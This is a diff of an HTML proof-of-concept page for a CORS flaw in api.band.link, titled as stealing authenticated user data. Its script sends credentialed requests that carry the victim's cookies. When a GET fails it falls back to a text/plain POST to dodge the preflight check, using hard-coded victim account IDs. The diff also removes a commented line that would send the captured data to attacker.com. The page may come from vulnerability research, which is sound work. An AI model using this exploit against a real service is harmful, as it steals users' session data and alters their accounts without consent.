@@ -1,41 +1,50 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>CORS PoC - band.link</title>
-</head>
+<head><title>CORS PoC - band.link</title></head>
 <body>
   <h2>CORS PoC - Stealing Authenticated User Data from api.band.link</h2>
   <pre id="output">Sending request...</pre>
 
   <script>
-    // Replace with a valid bandlink ID belonging to the victim account
-    const payload = {
-      "selected_domain": "band.link",
-      "hex": "N0Ed7",          // victim's bandlink hex
-      "id": 4867715,           // victim's bandlink id
-      "type": "playlist"
-      // minimal required fields
-    };
-
-    fetch("https://api.band.link/bandlink/update", {
-      method: "POST",
-      credentials: "include",   // sends victim's cookies automatically
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(payload)
+    // First try a GET request to a simpler endpoint
+    fetch("https://api.band.link/bandlink/list", {
+      method: "GET",
+      credentials: "include"
     })
-    .then(response => response.json())
+    .then(response => {
+      if (!response.ok) throw new Error("HTTP " + response.status);
+      return response.json();
+    })
     .then(data => {
       document.getElementById("output").textContent =
         "✅ Data stolen from victim session:\n\n" +
         JSON.stringify(data, null, 2);
-
-      // In a real attack, send to attacker's server:
-      // fetch("https://attacker.com/collect?d=" + encodeURIComponent(JSON.stringify(data)));
     })
     .catch(err => {
       document.getElementById("output").textContent = "Error: " + err;
+      
+      // Fallback: try POST with text/plain to avoid preflight
+      fetch("https://api.band.link/bandlink/update", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "text/plain"
+        },
+        body: JSON.stringify({
+          "selected_domain": "band.link",
+          "hex": "N0Ed7",
+          "id": 4867715,
+          "type": "playlist"
+        })
+      })
+      .then(r => r.json())
+      .then(data => {
+        document.getElementById("output").textContent =
+          "✅ Data stolen:\n\n" + JSON.stringify(data, null, 2);
+      })
+      .catch(e => {
+        document.getElementById("output").textContent = "Both failed: " + e;
+      });
     });
   </script>
 </body>
